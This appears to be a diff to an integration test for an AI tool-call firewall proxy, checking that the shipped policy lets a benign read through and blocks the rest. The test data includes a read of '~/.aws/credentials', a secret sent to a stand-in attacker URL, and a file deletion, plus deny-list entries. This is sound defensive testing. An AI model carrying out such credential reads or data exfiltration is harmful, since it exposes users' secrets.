@@ -6,7 +6,8 @@
  *    (tests/fixtures/counting-server.ts). Received counts are read directly from
  *    the fixture via upstream.callTool('get_call_counts'), bypassing the proxy.
  * 3. CLI smoke: spawn src/index.ts with a temp config and read the fixture's counts file.
- * 4. CLI with Kritish's demo/mock-server.ts as the downstream (read-only use of demo/*).
+ * 4. CLI with Kritish's demo/mock-server.ts as the downstream, the shipped config/firewall.yaml
+ *    policy and Winston's real evaluator (read-only use of demo/* and src/security/*).
  */
 import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
@@ -15,6 +16,7 @@ import { Client } from '@modelcontextprotocol/client';
 import { StdioClientTransport } from '@modelcontextprotocol/client/stdio';
 import { InMemoryTransport, SdkError, SdkErrorCode, type CallToolResult } from '@modelcontextprotocol/server';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
+import { loadConfig } from '../src/config/load.js';
 import { DUMMY_SECRET as MOCK_DUMMY_SECRET, MOCK_TOOL_NAMES, type MockToolName } from '../demo/mock-server.js';
 import {
   BLOCKED_PREFIX,
@@ -705,17 +707,22 @@ describe('proxy / CLI smoke (src/index.ts)', () => {
 });
 
 // ---------------------------------------------------------------------------
-// CLI with the real demo downstream: src/index.ts → demo/mock-server.ts
+// CLI with the real demo downstream and the shipped policy:
+// src/index.ts (real evaluator) → demo/mock-server.ts
 // ---------------------------------------------------------------------------
 
-describe('proxy / CLI with demo/mock-server.ts', () => {
+describe('proxy / CLI with demo/mock-server.ts and config/firewall.yaml policy', () => {
   const mockPath = resolve(repoRoot, 'demo/mock-server.ts');
-  /** One call per mock tool; Record<MockToolName, …> fails typecheck if the mock gains a tool. */
-  const callArgs: Record<MockToolName, Record<string, unknown>> = {
-    read_project_file: { path: 'README.md' },
-    read_sensitive_file: { path: '~/.aws/credentials' },
-    send_data: { url: 'https://example-attacker.invalid/collect', data: ARG_SECRET },
-    delete_file: { path: 'README.md' },
+  type Expectation = { args: Record<string, unknown>; blockedBy?: readonly string[] };
+  /**
+   * One call per mock tool (Record<MockToolName, …> fails typecheck if the mock gains a tool),
+   * with the outcome design §7 requires under config/firewall.yaml.
+   */
+  const scenarios: Record<MockToolName, Expectation> = {
+    read_project_file: { args: { path: 'README.md' } },
+    read_sensitive_file: { args: { path: '~/.aws/credentials' }, blockedBy: ['PROTECTED_PATH'] },
+    send_data: { args: { url: 'https://example-attacker.invalid/collect', data: ARG_SECRET }, blockedBy: ['DENIED_DESTINATION'] },
+    delete_file: { args: { path: 'README.md' }, blockedBy: ['DENIED_TOOL', 'DESTRUCTIVE_ACTION'] },
   };
   let dir: string;
   let countsFile: string;
@@ -736,16 +743,8 @@ describe('proxy / CLI with demo/mock-server.ts', () => {
         timeoutMs: 10_000,
       },
       monitor: { enabled: false },
-      // Nothing approved: all four calls must be BLOCKED with the current deny-all
-      // stub AND with a real evaluator, so this test survives Winston's merge.
-      policy: {
-        defaultDecision: 'DENY',
-        protectedPaths: ['~/.aws/credentials'],
-        deniedDestinations: ['example-attacker.invalid'],
-        approvedTools: [],
-        deniedTools: ['demo/delete_file'],
-        destinationArgs: { 'demo/send_data': ['url'] },
-      },
+      // The policy exactly as shipped, so this test breaks if config and mock drift apart.
+      policy: loadConfig(resolve(repoRoot, 'config/firewall.yaml')).policy,
     };
     writeFileSync(configPath, JSON.stringify(config, null, 2));
 
@@ -782,15 +781,30 @@ describe('proxy / CLI with demo/mock-server.ts', () => {
     for (const name of MOCK_TOOL_NAMES) expect(proxied.tools.map((t) => t.name)).toContain(name);
   });
 
-  it('every mock tool is BLOCKED and the mock receives zero calls', async () => {
-    expect(readCounts()).toEqual(Object.fromEntries(MOCK_TOOL_NAMES.map((t) => [t, 0])));
+  it('T01: a benign project read is allowed, forwarded once and returned unchanged', async () => {
+    expect(readCounts().read_project_file).toBe(0);
+    const proxied = (await firewall.callTool({
+      name: 'read_project_file',
+      arguments: scenarios.read_project_file.args,
+    })) as CallToolResult;
+    expect(proxied.isError).toBeFalsy();
+    expect(metaOf(proxied)).toBeUndefined();
+    expect(readCounts().read_project_file).toBe(1);
+    const viaDirect = await direct.callTool({ name: 'read_project_file', arguments: scenarios.read_project_file.args });
+    expect(proxied).toEqual(viaDirect);
+  });
+
+  it('T02–T04: protected read, denied destination and delete are BLOCKED and never reach the mock', async () => {
     for (const name of MOCK_TOOL_NAMES) {
-      const result = (await firewall.callTool({ name, arguments: callArgs[name] })) as CallToolResult;
+      const { args, blockedBy } = scenarios[name];
+      if (!blockedBy) continue;
+      const result = (await firewall.callTool({ name, arguments: args })) as CallToolResult;
       expect(result.isError, name).toBe(true);
-      expect(textOf(result).startsWith(BLOCKED_PREFIX), name).toBe(true);
+      expect(textOf(result).startsWith(`${BLOCKED_PREFIX} (`), name).toBe(true);
       expect(metaOf(result)?.decision, name).toBe('DENY');
+      expect(blockedBy, name).toContain(metaOf(result)?.ruleId);
+      expect(readCounts()[name], name).toBe(0);
     }
-    for (const name of MOCK_TOOL_NAMES) expect(readCounts()[name], name).toBe(0);
   });
 
   it('stderr never contains the dummy secret or argument values', () => {
